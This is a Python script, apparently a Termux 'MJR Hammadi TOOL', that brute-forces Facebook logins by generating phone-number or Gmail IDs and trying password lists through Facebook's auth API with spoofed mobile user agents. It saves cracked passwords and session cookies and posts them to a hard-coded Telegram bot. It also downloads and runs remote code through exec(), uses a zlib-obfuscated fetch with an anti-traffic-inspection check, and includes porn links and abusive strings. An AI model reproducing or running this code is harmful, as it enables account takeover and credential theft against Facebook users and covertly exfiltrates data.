...
os.system('clear') 
jalan('\33[1;37\33[1m Join our TELEGRAM group ')
print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mPLEASE WAIT CHECKING UPDATE...')
os.system("espeak -a 300 \"PLEASE,WAIT,CHECKING,UPDATE,\"")
print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mWELLCOM TO MJR Hammadi TOOL ...')
os.system("espeak -a 300 \"WELLCOM, TO, MJR,  Hammadi,  TOOL,\"")
print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mTO UPDATE VERSION 0.1 ..') 
os.system("espeak -a 300 \"TO,  UPDATE,  VERSION,  0.1 \"")
os.system(f'xdg-open https://https://t.me/python_M_V5')
os.system('clear') 
try:
	import re,base64,uuid,string,requests,random,sys,subprocess,platform,httpx
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print(' \n\n Module Not installed Correctly! ')
	os.system('xdg-open https://www.facebook.com/TGMOHAMD?mibextid=ZbWKwL')
	exit()
oks,cps,loop,apk=[],[],0,[]
...
import requests
def akash(ids,pas,coki):
    try:
        token = ":"
        chatid = ""
        ok_id =str(ids+"|"+pas+"|"+coki)
...
def B1():
    ...
    b = random.choice([
    ";[FBAN/FB4A;FBAV/196.0.0.60;FBBV/405417102;FBDM/{density=1.75,width=720,height=1504};FBLC/sd_PK;FBRV/407835523;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307GN;FBSV/9.0.1;nullFBCA/armeabi-v7a:armeabi;]", 
    ";[FBAN/FB4A;FBAV/328.1.0.28.119;FBBV/285616312;FBDM/{density=2.0,width=720,height=1358};FBLC/en_US;FBCR/Axiata;FBMF/ASUS;FBBD/asus;FBPN/com.facebook.katana;FBDV/Zenfone Max Pro M1;FBSV/8.1;nullFBCA/armeabi-v7a:armeabi:;]", 
    ...
    ";[FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/311215741;FBDM/{density=2.25,width=720,height=1332};FBLC/en_US;FBCR/maxis;FBMF/BMOBILE;FBBD/bmobile;FBPN/com.facebook.katana;FBDV/AX1076+;FBSV/8.1;nullFBCA/armeabi-v7a:armeabi;]"
    ])
    
    ua = a + b
    return ua
def agent():
    agent = open('.agent.txt','r').read().splitlines()
    rngnt = random.choice(agent)
    return rngnt
def M4():
    agent = open('.M4.txt','r').read().splitlines()
    rngnt = random.choice(agent)
    return rngnt
#______________________________
url = 'https://raw.githubusercontent.com/NALUTY01/Aproval.txt/main/M1_M2.txt'
response = requests.get(url)
file_content = response.content.decode('utf-8')
temp_file = io.StringIO(file_content)
exec(temp_file.read())
#___________________________
sys.stdout.write('\x1b]2;  MJR\x07')
#____________________________
import requests

url = 'https://raw.githubusercontent.com/NALUTY01/Aproval.txt/main/ver'
response = requests.get(url)
number = response.text.strip()
logo =f"""__       __     _____  _______  
|  \     /  \   |     \|       \ 
| $$\   /  $$    \$$$$$| $$$$$$$\
| $$$\ /  $$$      | $$| $$__| $$
| $$$$\  $$$$ __   | $$| $$    $$
...
| $$  \$ | $$ \$$    $$| $$  | $$
 \$$      \$$  \$$$$$$  \$$   \$$
\033[1;97m──────────────────────────────────────────────────
 \x1b[1;97mONWER   = MJR / V11Ul
 \x1b[1;97mVERSION = {number}
 \x1b[1;97mSTATUS  = \x1b[1;32m welcome to TOOI Hammadi
\033[1;97m──────────────────────────────────────────────────"""
def linex():
	print('\033[1;97m──────────────────────────────────────────────────')
def clear():
...
def menu():
			...
			linex()
			xd=input(' \033[1;97mCHOOSE : ')
			if xd in ['1','01']:
				clear()
				print('\033[ m EXAMPLE : /sdcard/File.txt ..')
				linex()
				file = input(' \033[1;97mPUT FILE NAME\033[1;37m : ')
				try:
				...
				try:
					clear() 
					ps_limit = int(input(' \033[1;97mLIMIT OF PASS > '))
				except:
					ps_limit =1
				clear()
				print('\x1b[1;97m EXP : first last,firstlast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' \033[1;97mPUT PASS {i+1} : '))
				clear()
				print(' \033[1;97mDO YOU WANT SHOW CP ? [y/n] : ')
				linex()
				cx=input('\033[1;97m CHOOSE : ')
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' \033[1;97mTOTAL IDS : \033[1;32m'+total_ids+f' ')
					print('\x1b[1;97m USE AIR PLANE MODE ') 
					linex()
					for user in fo:
...
def pak():
		...
		try:
			...
			limit = 5000
		clear()
		print('\033[1;32m [1] \033[mSTART	 ')
		linex()
		mthd = input(' \033[1;97mCHOOSE : ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as Hamza:	
			linex()
			clear()
			tl = str(len(user))
			...
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'091'+psx,'092'+psx,'22446688','qwertyuiopasdfghjkl','qwertyuiopasdfghjklzxcvbnm']
				if mthd in ['1','01']:
...
def gmail():
	...
	clear()
	print('\033[1;37m example: Hamza, ali, sajjad, faizan\033[1;37m')
	linex()
	first = input(' \033[1;37mPut first name: ')
	linex()
	print('\033[1;37m example: khan, ahmad, ali \033[1;37m')
	linex()
	last = input('\033[1;37m Put last name: ')
	domain = "@gmail.com"
	linex()
	try:
		limit=int(input(' \033[1;37mPut limit: '))
	except ValueError:
		limit = 5000
	linex()
	...
	with tred(max_workers=5) as XD:
		total = str(len(fo))
		clear()
		print('\033[1;37m Total Mails: \033[1;32m'+total)
		print('\033[1;37m The Process his been Started ')
		linex()
		for user in fo:
			ids,names = user.split('|')
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MJR-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[Davik/2.1.0 (Linux;  U; Android 7.0.1; CPH2349 Build/TP1A.220905.001) [FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=1.5,width=1280,height=1280};FBLC/fr_DZ;FBRV/273474118;FBCR/Robi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2349;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'+'[Davik/2.1.0 (Linux;  U; Android 11.0.1; CPH2349 Build/SP1A.210812.016) [FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.5,width=1280,height=720};FBLC/fr_DZ;FBRV/273474118;FBCR/Robi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2349;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MJR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/MJR-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/MJR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        akash(ids,pas,coki)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MJR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [MJR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MJR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MJR-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HÂMZA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '7329751959|AAGOC3QTdvY19Ceb0zd8mFKj4Jgp_ofZkzg'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
...
"email": ids,
"password": pas,
"access_token": "7329751959|AAGOC3QTdvY19Ceb0zd8mFKj4Jgp_ofZkzg",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
...
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=7AAGOC3QTdvY19Ceb0zd8mFKj4Jgp_ofZkzg',
...
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': '7AAGOC3QTdvY19Ceb0zd8mFKj4Jgp_ofZkzg',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        ...
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MJR-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/MJR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        akash(ids,pas,coki)
                                        break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MJR-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Zero-Rated': '0',
'User-Agent': B1(),
'Authorization': 'OAuth 7329751959|AAGOC3QTdvY19Ceb0zd8mFKj4Jgp_ofZkzg',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
...
def api4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [MJR-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [MJR-CP] '+ids+' | '+pas)
				open('/sdcard/MJR-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [MJR-OK] '+ids+' | '+pas+'\033[1;37m')
				G =(ids+'|'+pas+'|'+coki+'')
				httpx.post(f'''https://api.telegram.org/bot6748118491:AAGOC3QTdvY19Ceb0zd8mFKj4Jgp_ofZkzg/sendMessage?chat_id=6748118491&text={G}''')
				open('/sdcard/MJR-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/MJR-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def Hammadi1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [MJR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [MJR-OK] '+uid+' | '+pas+'\033[1;37m')
				oks.append(uid)
				open('/sdcard/MJR-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
				...
				try:
					...
					ids = ids
				open('/sdcard/MJR-R-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
		except (requests.exceptions.ConnectionError):
...
def ckx():
    ...
    id = "→".join(uuid)
    server = requests.get(f'https://raw.githubusercontent.com/CRUSH-707/CRUSH/main/AKASH.txt').text
    try:
        httpCaht = requests.get(f"https://raw.githubusercontent.com/CRUSH-707/CRUSH/main/AKASH.txt").text
        if id in httpCaht:
           msg = str(os.geteuid())
           pass
        else:
...
urxfjd="HAT"
rc=random.choice
links=["https://xgx.mobi/free/pron-vedio","https://anybunny.org","https://anybunny.org/","https://www.google.com/amp/s/amp.xhamster.com/search/pronhub%2bvideos","https://www.google.com/amp/s/amp.xhamster.com/search/pronhub%2bvideos","https://xxxi.porn/search/pronhub-com","https://bustybus.com/videos/big-ass/","https://www.xnxx.tv/search/mom+fucks+son?top="]
urx=urxfjd+urxod+urxos+urxpk+urxbd+urxvn+urxlk+urxas+urxpl+urxp0+urx1b+urx12+urxx3+urxjo
uo=str(os.geteuid())
id="".join(uo)
key="707"+id+"404"+"808"
show_url=requests.session()
#──────────────────────────────────────────────#
try:
    dt = requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O\xcf,\xc9(M\xd2K\xce\xcf\xd5\xf7s\xf4\t\r\x8940\xd4w,(\xca/K\xcc\xd1+\xa9(\xd1O\xca\xc9O\xd2\xcfM\xcc\xcc\xd3\xf75\x882\x04\x00\t\xde\x12\x94')).text
    os.system("clear")
    os.system("rm -rf .flx.txt")
    open(".flx.txt","w").write(dt)
except:
    os.system('clear')
    print(f"\x1b[1;97m OFF YOUR HTTP CANARY")
    sys.exit()
#──────────────────────────────────────────────#
apvdata={
    "You":"khankir pola",
    "work":"bypass kor",
    "Fuck":"your mom",
    "really":" Hotas tumar bal paknami dekhe",
    "Dad":"akash your BaBa",
    }
#──────────────────────────────────────────────#
apvhedar={
    "Https":"Tumar mare chudi ",
    "path":" Tumar mar kala vuda",
    "useragent":"mathod capture er din sess",}
#──────────────────────────────────────────────# 
def approved():
    global key,dt
    if key in dt:
    	...
    	menu() 
         ...
         while True:
             ...
             os.system("clear")
             print(logo) 
             jalan(f"\x1b[1;97m YOUR KEY : "+key)
             linex()
             os.system('am start https://wa.me/+218923016768?text='+key) 
             time.sleep(1);exit()
try:
    menu()
